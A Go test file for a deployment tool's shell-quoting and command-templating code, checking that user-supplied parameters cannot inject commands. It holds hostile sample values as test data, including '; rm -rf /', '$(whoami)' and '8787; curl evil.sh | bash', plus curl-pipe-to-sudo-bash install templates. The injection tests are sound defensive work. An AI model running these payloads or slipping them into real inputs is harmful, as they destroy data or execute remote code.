package deploy

import (
	"os/exec"
	"strings"
	"testing"

	"github.com/chinmay28/hostman/server/internal/store"
)

func TestShellQuote(t *testing.T) {
	cases := map[string]string{
		// Ordinary values stay readable...
		"8787":            "8787",
		"nakedpi.local":   "nakedpi.local",
		"http://pi:8787/": "http://pi:8787/",
		"v1.2.3-rc1":      "v1.2.3-rc1",
		// ...anything the shell could act on is quoted.
		"":                 `''`,
		"a b":              `'a b'`,
		"it's":             `'it'\''s'`,
		"; rm -rf /":       `'; rm -rf /'`,
		"$(whoami)":        `'$(whoami)'`,
		"`id`":             "'`id`'",
		"a'; touch /tmp/x": `'a'\''; touch /tmp/x'`,
		"~/secrets":        `'~/secrets'`,
		"*":                `'*'`,
		"a&b":              `'a&b'`,
		"a>b":              `'a>b'`,
		"a\\b":             `'a\b'`,
	}
	for in, want := range cases {
		if got := ShellQuote(in); got != want {
			t.Errorf("ShellQuote(%q) = %s, want %s", in, got, want)
		}
	}
}

func TestRenderSubstitutesAndQuotes(t *testing.T) {
	values := map[string]string{"port": "8787", "branch": "main"}
	got, err := Render("install --port {{port}} --ref {{ branch }}", values, true)
	if err != nil {
		t.Fatal(err)
	}
	if want := `install --port 8787 --ref main`; got != want {
		t.Errorf("Render = %s, want %s", got, want)
	}

	// Unquoted mode is for URLs and unit names.
	got, err = Render("http://{{host}}:{{port}}/health", map[string]string{"host": "pi.local", "port": "8787"}, false)
	if err != nil {
		t.Fatal(err)
	}
	if want := "http://pi.local:8787/health"; got != want {
		t.Errorf("Render = %s, want %s", got, want)
	}
}

func TestRenderRejectsUnknownPlaceholders(t *testing.T) {
	_, err := Render("install --port {{port}} --token {{secret}}", map[string]string{"port": "1"}, true)
	if err == nil {
		t.Fatal("expected an error for an undeclared placeholder")
	}
	if !strings.Contains(err.Error(), "secret") {
		t.Errorf("error = %v, want it to name the unknown placeholder", err)
	}
}

// A parameter value must never be able to add commands of its own.
func TestParamsCannotInjectCommands(t *testing.T) {
	app := &store.App{
		InstallCommand: "curl -fsSL https://example.com/q.sh | sudo bash -s -- --port {{port}}",
		Params:         []store.Param{{Name: "port", Label: "Port"}},
	}
	host := &store.Host{Name: "pi", Address: "10.0.0.5", Username: "chinmay"}

	command, _, err := BuildCommand(app, host, map[string]string{"port": "8787; curl evil.sh | bash"})
	if err != nil {
		t.Fatal(err)
	}
	// The whole value lands inside one quoted word: the only shell-significant
	// pipe is the one the app author wrote.
	want := `curl -fsSL https://example.com/q.sh | sudo bash -s -- --port '8787; curl evil.sh | bash'`
	if command != want {
		t.Fatalf("command = %s\nwant     = %s", command, want)
	}
}

// The quoting has to survive a real shell, not just look right.
func TestQuotedParamsSurviveARealShell(t *testing.T) {
	nasty := []string{
		"8787; touch /tmp/hostman-pwned",
		"$(id)",
		"`id`",
		"a'; id; echo '",
		`back\slash`,
		"new\nline",
	}
	for _, value := range nasty {
		out, err := exec.Command("/bin/sh", "-c", "printf '%s' "+ShellQuote(value)).Output()
		if err != nil {
			t.Fatalf("sh rejected %q: %v", value, err)
		}
		if string(out) != value {
			t.Errorf("shell saw %q, want the literal %q", out, value)
		}
	}
}

func TestBuildCommandDefaultsAndBuiltins(t *testing.T) {
	app := &store.App{
		InstallCommand: "deploy {{host}} {{hostname}} {{user}} --port {{port}} --tag {{tag}}",
		Params: []store.Param{
			{Name: "port", Label: "Port", Default: "8787"},
			{Name: "tag", Label: "Tag", Default: "latest"},
		},
	}
	host := &store.Host{Name: "nakedpi", Address: "192.168.2.123", Username: "chinmay"}

	command, params, err := BuildCommand(app, host, map[string]string{"tag": "v2"})
	if err != nil {
		t.Fatal(err)
	}
	want := `deploy 192.168.2.123 nakedpi chinmay --port 8787 --tag v2`
	if command != want {
		t.Errorf("command = %s\nwant     = %s", command, want)
	}
	// Stored params are what gets prefilled next time.
	if params["port"] != "8787" || params["tag"] != "v2" {
		t.Errorf("params = %v", params)
	}
	if _, ok := params["host"]; ok {
		t.Error("built-in host leaked into the saved params")
	}
}

// An uninstall renders from the app's other command, through the same
// parameters and the same quoting — undoing an install generally has to know
// what that install was told.
func TestBuildUninstallCommand(t *testing.T) {
	app := &store.App{
		InstallCommand:   "install --port {{port}}",
		UninstallCommand: "remove --port {{port}} --from {{host}} --dir {{dir}}",
		Params: []store.Param{
			{Name: "port", Label: "Port", Default: "8787"},
			{Name: "dir", Label: "Directory", Default: "/srv/photos"},
		},
	}
	host := &store.Host{Name: "nakedpi", Address: "192.168.2.123", Username: "chinmay"}

	// The values a real uninstall passes are the ones the installation kept.
	command, _, err := BuildUninstallCommand(app, host, map[string]string{
		"port": "9000", "dir": "/srv/my photos",
	})
	if err != nil {
		t.Fatal(err)
	}
	want := `remove --port 9000 --from 192.168.2.123 --dir '/srv/my photos'`
	if command != want {
		t.Errorf("command = %s\nwant     = %s", command, want)
	}
}

func TestBuildCommandRequiresRequiredParams(t *testing.T) {
	app := &store.App{
		InstallCommand: "install --token {{token}}",
		Params:         []store.Param{{Name: "token", Label: "API token", Required: true}},
	}
	host := &store.Host{Name: "pi", Address: "pi.local", Username: "u"}

	if _, _, err := BuildCommand(app, host, nil); err == nil {
		t.Fatal("expected an error when a required parameter is missing")
	} else if !strings.Contains(err.Error(), "API token") {
		t.Errorf("error = %v, want it to name the parameter", err)
	}

	// Whitespace is not a value.
	if _, _, err := BuildCommand(app, host, map[string]string{"token": "   "}); err == nil {
		t.Error("expected blank input to count as missing")
	}
	if _, _, err := BuildCommand(app, host, map[string]string{"token": "abc"}); err != nil {
		t.Errorf("unexpected error: %v", err)
	}
}

// An app cannot redefine {{host}} to point somewhere else.
func TestBuiltinsWinOverParams(t *testing.T) {
	app := &store.App{
		InstallCommand: "ping {{host}}",
		Params:         []store.Param{{Name: "host", Label: "Host", Default: "evil.example"}},
	}
	host := &store.Host{Name: "pi", Address: "10.0.0.5", Username: "u"}
	command, _, err := BuildCommand(app, host, map[string]string{"host": "evil.example"})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(command, "10.0.0.5") {
		t.Errorf("command = %s, want the real host address", command)
	}
}

// Values are substituted as whole quoted words, so a placeholder that is
// already inside quotes would pick up literal quote characters.
func TestValidateShellTemplateRejectsQuotedPlaceholders(t *testing.T) {
	bad := []string{
		`echo "port {{port}}"`,
		`echo 'port {{port}}'`,
		`sh -c "install --tag {{tag}}"`,
	}
	for _, tmpl := range bad {
		err := ValidateShellTemplate(tmpl)
		if err == nil {
			t.Errorf("ValidateShellTemplate(%q) = nil, want an error", tmpl)
			continue
		}
		if !strings.Contains(err.Error(), "quotes") {
			t.Errorf("error for %q = %v, want it to explain the quoting", tmpl, err)
		}
	}

	good := []string{
		`curl -fsSL https://example.com/q.sh | sudo bash -s -- --port {{port}}`,
		`echo {{port}}`,
		`echo "static text" && install {{tag}}`,
		`echo \" {{tag}}`,
		`install --note "no placeholders here"`,
	}
	for _, tmpl := range good {
		if err := ValidateShellTemplate(tmpl); err != nil {
			t.Errorf("ValidateShellTemplate(%q) = %v, want nil", tmpl, err)
		}
	}
}

func TestWrapCommandAddsPrelude(t *testing.T) {
	got := WrapCommand("curl -fsSL https://example.com/q.sh | sudo bash")
	if !strings.Contains(got, "pipefail") {
		t.Error("prelude should enable pipefail so a failing curl fails the deploy")
	}
	if !strings.Contains(got, "DEBIAN_FRONTEND=noninteractive") {
		t.Error("prelude should stop apt from prompting")
	}
	if !strings.HasSuffix(got, "curl -fsSL https://example.com/q.sh | sudo bash") {
		t.Errorf("command not preserved: %q", got)
	}
}
